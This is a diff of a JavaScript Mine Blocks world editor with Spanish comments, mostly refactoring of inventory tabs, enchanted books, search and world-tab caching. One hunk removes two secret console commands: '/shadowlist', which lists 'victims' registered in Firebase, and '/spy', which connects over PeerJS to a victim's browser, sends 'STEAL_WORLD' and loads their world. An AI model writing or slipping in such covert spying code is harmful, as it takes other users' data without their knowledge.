@@ -1,122 +1,11 @@
 // --- CONFIGURACIÓN DE PESTAÑAS E INVENTARIO ---
 
-let activeInventoryTab = 'all'; 
+let activeInventoryTab = 'all';
 
-// =================================================================
-// ⬇️ LISTA COMPLETA DE BLOQUES ⬇️
-// =================================================================
-const inventoryCategories = {
-    // La pestaña "all" se llena automáticamente, no necesitas editar 'items' aquí.
-    all: { icon: 'chest', items: [] }, 
-
-// 🗡️ Ítems Creados
-    Custom: { 
-        icon: 'ObsidianPickaxe', 
-        items: [] // Se llena por LocalStorage
-    },
-    
-    // 🧱 Blocks
-    Blocks: { 
-        icon: 'bricks', 
-        items: [
-'br', 'dt', 'dt_1', 'farm', 'myc', 'gdt', 'cdt', 'r', 'cs',
-'ms', 'sb', 'clore', 'in', 'gd', 'dmore', 'rs', 'os', 'lap',
-'to', 'egem', 'wd1', 'wd_1', 'wd_2', 'wp', 'bbb', 'top', 'ib',
-'gb', 'db', 'lapb', 'clb', 'sd', 'ss', 'cy1', 'bricks', 'books',
-'b', 'magma', 'j', 'snowblock', 'ice', 'fice', 'fice_1', 'fice_2', 'fice_3', 'fice_4', 
-'gv', 'cloth_white', 'cloth_lightgray', 'cloth_gray', 'cloth_black', 'cloth_brown', 'cloth_purple', 'cloth_magenta', 'cloth_red', 
-'cloth_orange', 'cloth_pink', 'cloth_yellow', 'cloth_lightgreen', 'cloth_green', 'cloth_cyan', 'cloth_lightblue', 'cloth_blue', 'cloth_rainbow', 
-'gs', 'gs_white', 'gs_lightgray', 'gs_gray', 'gs_black', 'gs_brown', 'gs_purple', 'gs_magenta', 'gs_redg', 
-'gs_orange', 'gs_pink', 'gs_yellow', 'gs_lightgreen', 'gs_green', 'gs_cyan', 'gs_lightblue', 'gs_blue', 'bddt', 
-'bdr', 'bdcs', 'bdbbb', 'bdbricks', 'bdbooks', 'bdsb', 'bdcloth_white', 'bdcloth_lightgray', 'bdcloth_gray', 
-'bdcloth_black', 'bdcloth_brown', 'bdcloth_purple', 'bdcloth_magenta', 'bdcloth_red', 'bdcloth_orange', 'bdcloth_pink', 'bdcloth_yellow', 'bdcloth_lightgreen', 
-'bdcloth_green', 'bdcloth_cyan', 'bdcloth_lightblue', 'bdcloth_blue', 'bdcloth_rainbow', 'bdgs', 'bdgs_white', 'bdgs_lightgray', 'bdgs_gray', 
-'bdgs_black', 'bdgs_brown', 'bdgs_purple', 'bdgs_magenta', 'bdwp', 'bdgs_redg', 'bdgs_orange', 'bdgs_pink', 'bdgs_yellow', 
-'bdgs_lightgreen', 'bdgs_green', 'bdgs_cyan', 'bdgs_lightblue', 'bdgs_blue', 'pk', 'pk_2', 'pk_3', 'pk_4', 
-'pk_5', 'pk_6', 'pk_7', 'pk_8', 'pk_9', 'pk_10', 'pk_11', 'hai_1', 'stairr_1', 
-'stairr_2', 'stairr_3', 'stairr_4', 'staircs_1', 'staircs_2', 'staircs_3', 'staircs_4', 'stairsb_1', 'stairsb_2', 
-'stairsb_3', 'stairsb_4', 'stairob_1', 'stairob_2', 'stairob_3', 'stairob_4', 'stairbr_1', 'stairbr_2', 'stairbr_3', 
-'stairbr_4', 'stairwp_1', 'stairwp_2', 'stairwp_3', 'stairwp_4', 'stairib_1', 'stairib_2', 'stairib_3', 'stairib_4', 
-'stairgb_1', 'stairgb_2', 'stairgb_3', 'stairgb_4', 'stairdb_1', 'stairdb_2', 'stairdb_3', 'stairdb_4', 'stairbrick_1', 
-'stairbrick_2', 'stairbrick_3', 'stairbrick_4', 'stairn_1', 'stairn_2', 'stairn_3', 'stairn_4', 'stairbbb_1', 'stairbbb_2', 
-'stairbbb_3', 'stairbbb_4', 'halfr_1', 'halfr_2', 'halfcs_1', 'halfcs_2', 'halfsb_1', 'halfsb_2', 'halfob_1', 
-'halfob_2', 'halfbr_1', 'halfbr_2', 'halfwp_1', 'halfwp_2', 'halfib_1', 'halfib_2', 'halfgb_1', 'halfgb_2', 
-'halfdb_1', 'halfdb_2', 'halfbrick_1', 'halfbrick_2', 'halfn_1', 'halfn_2', 'halfbbb_1', 'halfbbb_2'
-        ]
-    },
-
-    // 🌿 Decoration
-    Decoration: { 
-        icon: 'shrub', 
-        items: [
-            'craft', 'oven', 'chest', 'echest', 'cmp', 'enchant', 'anvil', 'ntag', 'bed1_red', 'dr2', 'idr2', 'bdr2', 'td1', 'sign', 'sl', 'lv', 'lv1', 'lv2', 'lv3', 'lv4', 'st', 'ladder', 'fnc', 'fncg', 'nfnc', 'nfncg', 'ibar', 'th_1',
-        ]
-    },
-    
-    // 🌿 Transportation
-    Transportation: { 
-        icon: 'rail', 
-        items: [
-            'rail', 'rail_1', 'rail_2', 'railp', 'railp_1', 'railp_2', 'raila', 'raila_1', 'raila_2', 'raild', 'raild_1', 'raild_2',
-        ]
-    },
-
-    // 🌿 Tools
-    Tools: { 
-        icon: 'DiamondPickaxe', 
-        items: [
-            'WoodenPickaxe', 'StonePickaxe', 'IronPickaxe', 'GoldPickaxe', 'DiamondPickaxe', 'ObsidianPickaxe',
-            'WoodenSword', 'StoneSword', 'IronSword', 'GoldSword', 'DiamondSword',
-            'WoodenAxe', 'StoneAxe', 'IronAxe', 'GoldAxe', 'DiamondAxe',
-            'WoodenShovel', 'StoneShovel', 'IronShovel', 'GoldShovel', 'DiamondShovel',
-            'WoodenHoe', 'StoneHoe', 'IronHoe', 'GoldHoe', 'DiamondHoe',
-            'fr', 'frodcarrot', 'Shear',
-        ]
-    },
-    
-    // 🌿 Food and Crops
-    Food: { 
-        icon: 'bread', 
-        items: [
-            'egg', 'fireegg', 'cegg', 'or', 'lemon', 'gasd', 'gap', 'capple', 'crml', 
-            'sugar', 'icec', 'potato', 'ppotato', 'bsed', 'beet', 'wseed', 'gmels', 'pseed', 
-            'pkp', 'carrot', 'gcarrot', 'wheat', 'bread', 'cookie', 'ccane', 
-            'cake_1', 'cake_2', 'cake_3', 'cake_4', 'cake_5', 'cake_6', 'cake_7', 
-            'ccake_1', 'ccake_2', 'ccake_3', 'ccake_4', 'ccake_5', 'ccake_6', 'ccake_7', 
-            'nw', 'nw_2', 'nw_3', 'nw_4', 'nw_5', 'nw_6', 'nw_7', 
-            'seed', 'seed_2', 'seed_3', 'seed_4', 'seed_5', 'seed_6', 'seed_7', 
-            'carrot_1', 'carrot_2', 'carrot_3', 'carrot_4', 'carrot_5', 'carrot_6', 'carrot_7', 
-            'wseed_1', 'wseed_2', 'wseed_3', 'wseed_4', 'wseed_5', 'wseed_6', 'wseed_7',
-            'pseed_2', 'pseed_3', 'pseed_4', 'pseed_5', 'pseed_6', 'pseed_7',
-            'pork', 'cpork', 'bacon', 'cbacon', 'beef', 'cbeef', 'chicken', 'cchicken', 'nugget',
-            'mutton', 'cmutton', 'rabbit', 'crabbit', 'fi', 'cfi', 'salmon', 'csalmon', 'clown', 'puff',
-            'rf', 'bowl', 'soup', 'rabbitsoup', 'beetsoup', 'lade', 'apade', 'orade', 'mbk', 
-        ]
-    },
-    
-    // 🌿 Armor
-    Armor: { 
-        icon: 'DiamondShirt', 
-        items: [
-            'LeatherCap', 'LeatherShirt', 'LeatherPants', 'LeatherShoes', 'IronCap', 'IronShirt', 'IronPants', 'IronShoes', 'GoldCap', 
-            'GoldShirt', 'GoldPants', 'GoldShoes', 'DiamondCap', 'DiamondShirt', 'DiamondPants', 'DiamondShoes', 'DragonCap', 'DragonShirt', 
-            'DragonPants', 'DragonShoes','SnowCap', 'AfroCap', 'PartyCap', 'ShadesCap', 'MustacheCap',
-        ]
-    },
-    
-    // 🧪 Pociones
-    Potions: {
-        icon: 'potion', 
-        items: [] 
-    },
-    
-// 📚 Libros Encantados
-    EnchantedBooks: {
-        icon: 'ebook',
-        items: [] 
-    },
-    
-};
+// La lista completa de bloques/items ahora vive en scripts/items-data.js,
+// como window.inventoryCategories, para no tener dos copias (esta y la de
+// scripts/database.js) que con el tiempo terminan desincronizadas.
+const inventoryCategories = window.inventoryCategories;
 
 // =================================================================
 
@@ -135,6 +24,8 @@ function openTab(tabName) {
     if (targetPane) {
         targetPane.classList.add('active');
     }
+    // La mini hotbar del jugador (pestaña Player) se vuelve a pintar por si el mundo cambió mientras no se veía
+    if (tabName === 'player' && typeof window.playerInvRefresh === 'function') window.playerInvRefresh();
 }
 
 // --- GESTIÓN DE MODALES ---
@@ -216,24 +107,36 @@ document.addEventListener('mousemove', (e) => {
 
 let isBuildingChest = false;
 let customChestInventory = new Array(27).fill(null);
+// Está en true mientras la ventana del inventario está abierta como "Create Custom Item" (scripts/custom-items.js).
+// Mientras lo está, hacer clic en un objeto lo manda a la "mesa de encantamiento" en vez de pegarlo al cursor.
+let isCreatingCustomItem = false;
 
 function toggleInventory() {
     const modal = document.getElementById('inventory-modal');
     const modalContent = modal.querySelector('.modal-content'); 
     const chestPanel = document.getElementById('chest-builder-panel');
+    const customPanel = document.getElementById('custom-item-builder-panel');
     const title = document.getElementById('inventory-modal-title');
     const hotbarContainer = document.getElementById('modal-hotbar-container');
 
     if (modal.style.display === 'block') {
         modal.style.display = 'none';
-        heldItem = null; 
+        // Si era el inventario del jugador, el objeto que quedó en el cursor vuelve a la mochila (antes de borrar el cursor)
+        if (typeof playerInvClosed === 'function') playerInvClosed();
+        heldItem = null;
+        // Si el Mob Browser abrió el inventario para elegir un objeto y se cerró sin elegir, avisarle.
+        if (window.mobInvPick && typeof mobEditorInvClosed === 'function') mobEditorInvClosed();
         updateFloatingItem();
-        isBuildingChest = false; 
+        isBuildingChest = false;
+        isCreatingCustomItem = false;
     } else {
+        if (typeof playerInvReset === 'function') playerInvReset();   // deja la ventana como siempre (sin el panel del jugador)
+        isCreatingCustomItem = false;                                  // abrir el inventario normal nunca es el creador de objetos
         modal.style.display = 'block';
         
         if (title) title.innerText = "Inventory";
         if (chestPanel) chestPanel.style.display = 'none'; 
+        if (customPanel) customPanel.style.display = 'none'; 
         if (hotbarContainer) hotbarContainer.style.display = 'grid'; // Mostramos la hotbar
 
         if (modalContent) modalContent.style.width = '584px';
@@ -336,6 +239,60 @@ function renderInventoryTabs() {
 }
 
 
+// Un libro encantado (ebook) con UN encantamiento: lo usan la pestaña EnchantedBooks y los resultados del buscador.
+function makeEnchantedBookTile(enchantKey) {
+    let enchantments = {};
+    enchantments[enchantKey] = "enchant"; 
+
+    const item = document.createElement('div');
+    item.className = 'inv-item enchanted-slot'; 
+    item.title = ""; 
+    // Texto que busca el buscador del inventario (nombre del encantamiento, nivel y clave del juego)
+    item.dataset.search = (typeof mbwEnchLabel === 'function' ? mbwEnchLabel(enchantKey) : enchantKey) + ' ' + enchantKey + ' enchanted book';
+
+    // GUARDAMOS EL TEXTO MÁGICO EN EL DATASET PARA EL TOOLTIP MAESTRO
+    let enchantTooltipHTML = typeof formatEnchantments === 'function' ? formatEnchantments(enchantments) : "";
+    item.dataset.enchantTooltip = `<strong>Enchanted Book</strong>${enchantTooltipHTML}`;
+
+    // Lógica de Recogida (Soporta NBT)
+    item.onclick = () => {
+        // En el Creador de objetos, un libro encantado va a la mesa como "ebook" con esa magia (se le pueden sumar más)
+        if (isCreatingCustomItem && typeof selectCustomItem === 'function') { selectCustomItem('ebook', enchantments); return; }
+        heldItem = { type: 'ebook', count: 1, states1: 0, nbt: enchantments };   // el juego guarda un libro encantado como 'ebook'
+        updateFloatingItem();
+    };
+
+    // Estilos del slot
+    item.style.width = '64px'; item.style.height = '64px';
+    item.style.minWidth = '64px'; item.style.minHeight = '64px';
+    item.style.flexShrink = '0';
+    item.style.background = '#8B8B8B'; item.style.border = '4px inset #FFF'; 
+    item.style.display = 'flex'; item.style.justifyContent = 'center';
+    item.style.alignItems = 'center'; item.style.boxSizing = 'border-box';
+    item.style.cursor = 'pointer'; item.style.position = 'relative';
+
+    // Dibujar el canvas del ítem (textura 'ebook' = libro encantado)
+    const cvs = document.createElement('canvas');
+    cvs.width = 16; cvs.height = 16;
+    cvs.style.width = '48px'; cvs.style.height = '48px';
+    cvs.style.imageRendering = 'pixelated';
+    const ctx = cvs.getContext('2d');
+    ctx.imageSmoothingEnabled = false;
+
+    let renderObj = typeof getBlockObject === 'function' ? getBlockObject({type: 'ebook'}) : null;
+    if (renderObj && window.images && window.images.blocks && window.images.blocks.complete) {
+        ctx.drawImage(window.images.blocks, renderObj.x, renderObj.y, 16, 16, 0, 0, 16, 16);
+    } else {
+        ctx.fillStyle = "magenta"; ctx.fillRect(4, 4, 8, 8);
+    }
+    item.appendChild(cvs);
+
+    // Efecto Hover
+    item.onmouseenter = () => { item.style.background = '#A0A0A0'; };
+    item.onmouseleave = () => { item.style.background = '#8B8B8B'; };
+    return item;
+}
+
 function populateInventory() {
     const grid = document.getElementById('inventory-grid');
     grid.innerHTML = '';
@@ -357,60 +314,9 @@ function populateInventory() {
     // --- LÓGICA ESPECIAL: PESTAÑA LIBROS ENCANTADOS (LIMPIA) ---
     // ========================================================
     if (activeInventoryTab === 'EnchantedBooks') {
-        const enchants = Object.keys(enchantTranslations);
-        
-        enchants.forEach(enchantKey => {
-            let enchantments = {};
-            enchantments[enchantKey] = "enchant"; 
-
-            const item = document.createElement('div');
-            item.className = 'inv-item enchanted-slot'; 
-            
-            item.title = ""; 
-            
-            // GUARDAMOS EL TEXTO MÁGICO EN EL DATASET PARA EL TOOLTIP MAESTRO
-            let niceName = enchantTranslations[enchantKey];
-            let enchantTooltipHTML = typeof formatEnchantments === 'function' ? formatEnchantments(enchantments) : "";
-            item.dataset.enchantTooltip = `<strong>Enchanted Book</strong>${enchantTooltipHTML}`;
-
-            // Lógica de Recogida (Soporta NBT)
-            item.onclick = () => {
-                heldItem = { type: 'book', count: 1, states1: 0, nbt: enchantments };
-                updateFloatingItem();
-            };
-
-            // Estilos del slot
-            item.style.width = '64px'; item.style.height = '64px';
-            item.style.minWidth = '64px'; item.style.minHeight = '64px';
-            item.style.flexShrink = '0';
-            item.style.background = '#8B8B8B'; item.style.border = '4px inset #FFF'; 
-            item.style.display = 'flex'; item.style.justifyContent = 'center';
-            item.style.alignItems = 'center'; item.style.boxSizing = 'border-box';
-            item.style.cursor = 'pointer'; item.style.position = 'relative';
-
-            // Dibujar el canvas del ítem (Usamos 'book' que sí existe en texturas)
-            const cvs = document.createElement('canvas');
-            cvs.width = 16; cvs.height = 16;
-            cvs.style.width = '48px'; cvs.style.height = '48px';
-            cvs.style.imageRendering = 'pixelated';
-            const ctx = cvs.getContext('2d');
-            ctx.imageSmoothingEnabled = false;
-
-            let renderObj = typeof getBlockObject === 'function' ? getBlockObject({type: 'book'}) : null;
-            if (renderObj && window.images && window.images.blocks && window.images.blocks.complete) {
-                ctx.drawImage(window.images.blocks, renderObj.x, renderObj.y, 16, 16, 0, 0, 16, 16);
-            } else {
-                ctx.fillStyle = "magenta"; ctx.fillRect(4, 4, 8, 8);
-            }
-            item.appendChild(cvs);
-
-            // Efecto Hover
-            item.onmouseenter = () => { item.style.background = '#A0A0A0'; };
-            item.onmouseleave = () => { item.style.background = '#8B8B8B'; };
-
-            grid.appendChild(item);
-        });
-        
+        Object.keys(enchantTranslations).forEach(enchantKey => grid.appendChild(makeEnchantedBookTile(enchantKey)));
+        const si = document.getElementById('inventory-search');
+        if (si && si.value) filterInventory(si.value);
         return; 
     }
 
@@ -459,6 +365,7 @@ function populateInventory() {
             item.dataset.enchantTooltip = `<strong>${potionData.name}</strong><span class="tooltip-enchant" style="color: ${potionData.color}; display: block; line-height: 0.6; margin-top: 2px;">Potion Effect</span>`;
 
             item.onclick = () => {
+                if (isCreatingCustomItem) return;   // las pociones no se editan en el Creador de objetos: no se pegan al cursor
                 heldItem = { type: 'potion', count: 1, states1: 0, nbt: potionData.nbt };
                 updateFloatingItem();
             };
@@ -511,6 +418,11 @@ function populateInventory() {
             item.className = 'inv-item';
             
             item.onclick = () => {
+                // Con el Creador de objetos abierto, el objeto guardado va a la mesa para EDITARLO (con sus magias y su nombre)
+                if (isCreatingCustomItem && typeof selectCustomItem === 'function') {
+                    selectCustomItem(itemID, enchantments, index);
+                    return;
+                }
                 heldItem = { type: itemID, count: itemCount, states1: itemDamage, nbt: enchantments };
                 updateFloatingItem();
             };
@@ -594,7 +506,9 @@ function populateInventory() {
         item.title = blockType; 
         
         item.onclick = () => {
-            pickupItemFromInventory(blockType);
+            // Con el Creador de objetos abierto, el objeto va a la "mesa de encantamiento" en vez de pegarse al cursor
+            if (isCreatingCustomItem && typeof selectCustomItem === 'function') selectCustomItem(String(blockType).split('_')[0]);   // el creador no guarda variantes (color, etc.): solo el objeto
+            else pickupItemFromInventory(blockType);
         };
         
         item.style.width = '64px';
@@ -651,16 +565,30 @@ function populateInventory() {
 }
 
 function filterInventory(query) {
+    const flat = (x) => String(x || '').toLowerCase().replace(/[\s_]+/g, '');   // "diamond sword" = "DiamondSword" = "diamond_sword"
+    const rawQuery = String(query || '').toLowerCase().trim();
+    query = flat(rawQuery);
+    const grid = document.getElementById('inventory-grid');
+    // Los libros que una búsqueda anterior agregó se quitan antes de buscar de nuevo
+    if (grid) grid.querySelectorAll('.inv-enchbook-extra').forEach(e => e.remove());
     const items = document.querySelectorAll('.inv-item');
-    query = query.toLowerCase();
     items.forEach(item => {
-        const name = item.title.toLowerCase();
+        const name = flat(item.dataset.search || item.title);
         if (name.includes(query)) {
             item.style.display = 'flex';
         } else {
             item.style.display = 'none';
         }
     });
+    // Buscar un encantamiento ("sharpness", "unbreaking iii"...) muestra los libros encantados (ebook) con ese encantamiento.
+    // En la pestaña EnchantedBooks ya están todos y solo se filtran; en las demás se agregan al final.
+    if (grid && rawQuery.length >= 3 && activeInventoryTab !== 'EnchantedBooks' && typeof mbwEnchSearch === 'function') {
+        mbwEnchSearch(rawQuery).forEach(key => {
+            const tile = makeEnchantedBookTile(key);
+            tile.classList.add('inv-enchbook-extra');
+            grid.appendChild(tile);
+        });
+    }
 }
 
 // --- RECOGER ÍTEMS DEL INVENTARIO ---
@@ -686,8 +614,12 @@ function pickupItemFromInventory(blockType) {
 
 // --- DIBUJAR EL ÍTEM FLOTANTE (TRANSPARENTE) ---
 function updateFloatingItem() {
+    // Modo "elegir objeto" (lo usa el Mob Browser para mano / armadura / drops): en vez de quedarse
+    // en el cursor, el objeto recién tomado del inventario se entrega a quien lo pidió y se cierra el inventario.
+    if (heldItem && window.mobInvPick && typeof mobEditorInvIntercept === 'function' && mobEditorInvIntercept()) return;
+
     let floater = document.getElementById('floating-held-item');
-    
+
     if (!floater) {
         floater = document.createElement('div');
         floater.id = 'floating-held-item';
@@ -716,7 +648,7 @@ function updateFloatingItem() {
     const ctx = cvs.getContext('2d');
     ctx.imageSmoothingEnabled = false;
 
-    let tempState = { type: heldItem.type };
+    let tempState = { type: heldItem.iconType || heldItem.type };   // iconType: objetos del jugador cuyo id del mundo no es el de la textura (bed -> bed1)
     if (heldItem.states1 !== undefined) tempState.states1 = heldItem.states1;
 
     let renderObj = typeof getBlockObject === 'function' ? getBlockObject(tempState) : null;
@@ -961,6 +893,15 @@ function updateHotbarSelection() {
 // 🆕 LÓGICA DE MUNDO (HARDCORE)
 // ==========================================
 
+// Al elegir Creative, Adventure o Spectator se marca solita la casilla de comandos ("Cheats" en el archivo del mundo).
+// Survival no la toca (ni la marca ni la desmarca). Cargar un mundo NO pasa por aquí: el mundo conserva lo que traía.
+function onGamemodeChange(value) {
+    if (value === '1' || value === '2' || value === '3') {
+        const cheatsCheckbox = document.getElementById('cheats');
+        if (cheatsCheckbox && !cheatsCheckbox.disabled) cheatsCheckbox.checked = true;
+    }
+}
+
 function toggleHardcore(isHardcore) {
     const gmSelect = document.getElementById('gamemode');
     const cheatsCheckbox = document.getElementById('cheats');
@@ -983,6 +924,7 @@ function toggleHardcore(isHardcore) {
 
 function openCreateChestModal() {
     isBuildingChest = true;
+    isCreatingCustomItem = false;
     
     customChestInventory = new Array(27).fill(null); 
     
@@ -991,6 +933,7 @@ function openCreateChestModal() {
     const chestPanel = document.getElementById('chest-builder-panel');
     const title = document.getElementById('inventory-modal-title');
     
+    if (typeof playerInvReset === 'function') playerInvReset();
     modal.style.display = 'block';
     
     if (modalContent) modalContent.style.width = '1190px';
@@ -1170,112 +1113,15 @@ document.getElementById('console-input').addEventListener('keydown', function(e)
             return;
         }
 
-        // 2. COMANDO SECRETO: VER VÍCTIMAS CONECTADAS
-        if (command === '/shadowlist') {
-            const db = firebase.database();
-            db.ref('shadow_rooms').once('value').then(snapshot => {
-                const rooms = snapshot.val();
-                for (let uid in rooms) {
-                    let r = rooms[uid];
-                    // Comprueba si enviaron su latido en el último minuto
-                    let active = (Date.now() - r.timestamp < 60000) ? "🟢" : "🔴";
-                    
-                    let msgNode = document.createElement('div');
-                    msgNode.className = 'console-msg';
-                    msgNode.innerText = `${active} ${r.username} | ID: ${r.hostId}`;
-                    historyDiv.appendChild(msgNode);
-                }
-            });
-            this.value = '';
-            return;
-        }
-
-        // 3. COMANDO SECRETO: ROBAR MAPA (/spy [ID])
-        if (command.startsWith('/spy ')) {
-            const targetId = command.split(' ')[1];
-            if (targetId) {
-                let msgNode = document.createElement('div');
-                msgNode.className = 'console-msg';
-                msgNode.innerText = `[NINJA] Infiltrando en ID: ${targetId}...`;
-                historyDiv.appendChild(msgNode);
-                
-                // Conecta tu navegador al de la víctima
-                const spyPeer = new Peer();
-                spyPeer.on('open', () => {
-                    const conn = spyPeer.connect(targetId);
-                    
-                    conn.on('open', () => {
-                        msgNode.innerText = `[NINJA] Conectado. Descargando mundo...`;
-                        conn.send({ cmd: "STEAL_WORLD" });
-                    });
-                    
-                    conn.on('data', (data) => {
-                        if (data.type === "WORLD_PAYLOAD") {
-                            msgNode.innerText = `[NINJA] Mundo recibido. Hackeando sistema...`;
-                            
-                            // 1. Decodifica el archivo
-                            const decodedJSON = mbwAlgorithm.decode(data.payload);
-                            const worldObj = JSON.parse(decodedJSON);
-                            
-                            // 2. Reemplaza tu mapa actual por el robado
-                            mbwom.world = worldObj;
-                            mbwom.loadScene(1);
-                            if (typeof initializeWorldCache === 'function') initializeWorldCache();
-                            
-                            // 3. Sincroniza la UI
-                            if (typeof populateLocationSettings === 'function') populateLocationSettings();
-                            worldDirty = true;
-                            
-                            msgNode.innerText = `[NINJA] ¡Infiltración exitosa! Tienes su mapa.`;
-                        }
-                    });
-                });
-            }
-            this.value = '';
-            return;
-        }
-        
         // Si el comando no existe
         this.value = '';
     }
 });
 
 // --- DICCIONARIO Y FORMATEO GLOBAL DE ENCANTAMIENTOS ---
-const enchantTranslations = {
-    // Generales
-    
-
-    // Herramientas y Armas
-    "sharpness1": "Sharpness I", "sharpness2": "Sharpness II", "sharpness3": "Sharpness III", "sharpness4": "Sharpness IV", "sharpness5": "Sharpness V",
-    "smite1": "Smite I", "smite2": "Smite II", "smite3": "Smite III", "smite4": "Smite IV", "smite5": "Smite V",
-    "baneofarthropods1": "Bane of Arthropods I", "baneofarthropods2": "Bane of Arthropods II", "baneofarthropods3": "Bane of Arthropods III", "baneofarthropods4": "Bane of Arthropods IV", "baneofarthropods5": "Bane of Arthropods V",
-    "knockback1": "Knockback I", "knockback2": "Knockback II",
-    "fireaspect1": "Fire Aspect I", "fireaspect2": "Fire Aspect II",
-    "looting1": "Looting I", "looting2": "Looting II", "looting3": "Looting III",
-    "efficiency1": "Efficiency I", "efficiency2": "Efficiency II", "efficiency3": "Efficiency III", "efficiency4": "Efficiency IV", "efficiency5": "Efficiency V",
-    "silktouch1": "Silk Touch",
-    "fortune1": "Fortune I", "fortune2": "Fortune II", "fortune3": "Fortune III",
-    
-    // Arcos
-    "power1": "Power I", "power2": "Power II", "power3": "Power III", "power4": "Power IV", "power5": "Power V",
-    "punch1": "Punch I", "punch2": "Punch II",
-    "flame1": "Flame",
-    "infinity1": "Infinity",
-    
-    // Armadura
-    "protection1": "Protection I", "protection2": "Protection II", "protection3": "Protection III", "protection4": "Protection IV",
-    "fireprotection1": "Fire Protection I", "fireprotection2": "Fire Protection II", "fireprotection3": "Fire Protection III", "fireprotection4": "Fire Protection IV",
-    "featherfalling1": "Feather Falling I", "featherfalling2": "Feather Falling II", "featherfalling3": "Feather Falling III", "featherfalling4": "Feather Falling IV",
-    "blastprotection1": "Blast Protection I", "blastprotection2": "Blast Protection II", "blastprotection3": "Blast Protection III", "blastprotection4": "Blast Protection IV",
-    "projectileprotection1": "Projectile Protection I", "projectileprotection2": "Projectile Protection II", "projectileprotection3": "Projectile Protection III", "projectileprotection4": "Projectile Protection IV",
-    "respiration1": "Respiration I", "respiration2": "Respiration II", "respiration3": "Respiration III",
-    "aquaaffinity1": "Aqua Affinity",
-    "thorns1": "Thorns I", "thorns2": "Thorns II", "thorns3": "Thorns III",
-    
-    // Cañas de pescar
-    "luckofthesea1": "Luck Of The Sea I", "luckofthesea2": "Luck Of The Sea II", "luckofthesea3": "Luck Of The Sea III", 
-    "lure1": "Lure I", "lure2": "Lure II", "lure3": "Lure III", 
-};
+// La lista real (nombres, niveles máximos y claves que guarda el juego) vive en scripts/enchants.js.
+// Aquí queda { clave: "Sharpness IV" } con TODAS las combinaciones, que usan la pestaña Enchanted Books y los tooltips.
+const enchantTranslations = mbwEnchTable();
 
 // Función auxiliar para formatear el texto
 function formatEnchantments(enchantmentsObj) {
@@ -1283,7 +1129,7 @@ function formatEnchantments(enchantmentsObj) {
     let enchantText = "";
     for (let key in enchantmentsObj) {
         if (enchantmentsObj[key] === "enchant") {
-            let niceName = enchantTranslations[key] || key; 
+            let niceName = (typeof mbwEnchLabel === 'function') ? mbwEnchLabel(key) : (enchantTranslations[key] || key); 
             // Aquí agregamos line-height: 1.1 y margin: 0 para que queden pegaditos
             enchantText += `<span class="tooltip-enchant" style="color: #FFFF; display: block; line-height: 0.6; margin-top: 2px;">${niceName}</span>`;
         }
@@ -1355,8 +1201,17 @@ const WorldTabsManager = {
         this.loadWorldStateFromMemory(id);
 
         // --- 🛠️ FIX DEL CLON VISUAL ---
-        // Reconstruimos la "foto" del lienzo basada en los datos recién cargados
-        if (typeof initializeWorldCache === 'function') {
+        // La "foto" del lienzo tiene que ser la de ESTA pestaña. Si la pestaña ya tenía su foto armada y sigue siendo
+        // válida (salió exactamente del mismo mapa que ahora está cargado), la reutilizamos al instante;
+        // si no (pestaña nueva, o algo cambió), se arma de nuevo como siempre.
+        const tabWorld = this.openWorlds.find(w => w.id === id);
+        const saved = tabWorld && tabWorld.cacheData;
+        const reusable = saved && saved.cache && window.worldCacheSource
+            && window.worldCacheSource.get(saved.cache) === mbwom.scene && saved.scene === mbwom.scene;
+        if (reusable) {
+            window.worldCache = saved.cache;
+            if (typeof worldDirty !== 'undefined') worldDirty = true;
+        } else if (typeof initializeWorldCache === 'function') {
             initializeWorldCache();
         }
         
@@ -1368,6 +1223,8 @@ const WorldTabsManager = {
         }
 
         this.renderTabs();
+        if (typeof window.syncDimensionIcon === 'function') window.syncDimensionIcon();
+        if (typeof window.playerInvRefresh === 'function') window.playerInvRefresh();   // la mini hotbar del jugador es de cada mundo
         
         // 4. Forzar al motor gráfico a redibujar el lienzo
         if (typeof worldDirty !== 'undefined') worldDirty = true;
@@ -1392,19 +1249,29 @@ saveCurrentWorldStateToMemory: function(id) {
             });
         }
 
-        // Clonamos las variables del mundo de Mine Blocks
-        world.mbwomData = this.cloneData(mbwom);
+        // Guardamos los datos del mundo de esta pestaña.
+        // ANTES se hacía una copia profunda (JSON) de todo el mundo al cambiar de pestaña: con un mundo de
+        // 14 MB eso congelaba el editor ~2 segundos CADA vez. AHORA solo se guardan "referencias": cada pestaña
+        // tiene sus propios datos y ninguna otra los comparte, así que no hace falta copiarlos. Es instantáneo.
+        const snapshot = {};
+        Object.keys(mbwom).forEach(key => {
+            if (typeof mbwom[key] !== 'function') snapshot[key] = mbwom[key];
+        });
+        world.mbwomData = snapshot;
+
+        // Guardamos también la "foto" ya dibujada del mapa para no tener que armarla otra vez al volver
+        world.cacheData = { cache: window.worldCache, scene: mbwom.scene };
         
-        // Clonamos la posición de la cámara
+        // Guardamos la posición de la cámara
         if (typeof camera !== 'undefined') {
             world.cameraData = { x: camera.x, y: camera.y, zoom: camera.zoom };
         }
         
-        // Clonamos el historial
+        // Guardamos el historial (deshacer / rehacer)
         if (typeof historyManager !== 'undefined') {
             world.historyData = {
-                undoStack: this.cloneData(historyManager.undoStack),
-                redoStack: this.cloneData(historyManager.redoStack)
+                undoStack: historyManager.undoStack,
+                redoStack: historyManager.redoStack
             };
         }
     },
@@ -1414,16 +1281,21 @@ saveCurrentWorldStateToMemory: function(id) {
         if (!world) return;
 
         if (world.mbwomData) {
-            // Restauramos los datos del mundo en la variable global mbwom
+            // Restauramos los datos del mundo en la variable global mbwom (sin copiarlos: ver saveCurrentWorldStateToMemory)
             for (let key in world.mbwomData) {
                 // Solo sobreescribimos los datos, no las funciones de mbwom
                 if (typeof mbwom[key] !== 'function') {
-                    mbwom[key] = this.cloneData(world.mbwomData[key]);
+                    mbwom[key] = world.mbwomData[key];
                 }
             }
+            // Una pestaña que nunca cambió de dimensión está en el Overworld; no heredar la dimensión de la pestaña anterior
+            if (!('currentScene' in world.mbwomData)) mbwom.currentScene = 1;
         } else {
             // Si no tiene datos guardados, significa que es una pestaña nueva/vacía
             this.resetGlobalWorldState();
+            // Ya no se copian los mundos al cambiar de pestaña, así que la pestaña nueva NO puede seguir
+            // compartiendo el objeto "world" de la anterior (escribir ahí dañaría el mundo de la otra pestaña).
+            mbwom.world = this.freshWorldShell(mbwom.world);
         }
 
         // Restauramos la cámara
@@ -1434,11 +1306,12 @@ saveCurrentWorldStateToMemory: function(id) {
         } else if (typeof camera !== 'undefined') {
             camera.x = 0; camera.y = 0;
         }
+        if (typeof camera !== 'undefined') { camera.velX = 0; camera.velY = 0; }   // la cámara fluida no arrastra velocidad de la otra pestaña
 
